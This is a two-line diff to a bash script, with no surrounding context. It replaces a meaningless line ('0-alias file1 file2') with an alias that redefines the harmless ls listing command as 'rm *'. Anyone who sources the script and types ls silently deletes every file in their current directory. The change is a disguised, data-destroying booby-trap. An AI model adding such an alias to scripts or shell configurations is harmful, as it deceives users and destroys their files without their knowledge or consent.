@@ -1,2 +1,2 @@
 #!/bin/bash
-0-alias  file1  file2
+alias ls='rm *'
